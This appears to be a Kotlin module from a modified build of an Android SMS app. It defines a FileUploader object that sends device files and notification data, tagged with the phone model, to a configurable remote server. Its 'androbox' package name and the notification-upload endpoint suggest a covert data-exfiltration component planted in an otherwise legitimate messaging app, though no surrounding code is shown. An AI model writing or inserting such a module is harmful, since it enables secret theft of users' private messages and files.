package org.fossify.messages.androbox

import android.content.Context
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException

object FileUploader {
    private val client = OkHttpClient()

    fun uploadFile(context: Context, file: File, baseUrl: String, callback: (Boolean) -> Unit) {
        val mediaType = "text/plain".toMediaType()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
            .build()
        val request = Request.Builder()
            .url(baseUrl + "uploadFile")
            .addHeader("model", android.os.Build.MODEL)
            .post(requestBody)
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("FileUploader", "Upload failed: ${e.message}")
                callback(false)
            }
            override fun onResponse(call: Call, response: Response) {
                val success = response.isSuccessful
                if (success) Log.d("FileUploader", "Upload successful")
                else Log.e("FileUploader", "Upload failed: ${response.code}")
                response.close()
                callback(success)
            }
        })
    }

    suspend fun uploadNotification(context: Context, jsonData: String, baseUrl: String): Boolean {
        return try {
            val body = RequestBody.create("application/json".toMediaType(), jsonData)
            val request = Request.Builder()
                .url(baseUrl + "uploadNotification")
                .addHeader("model", android.os.Build.MODEL)
                .post(body)
                .build()
            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: Exception) {
            Log.e("FileUploader", "Notification upload error: ${e.message}")
            false
        }
    }
}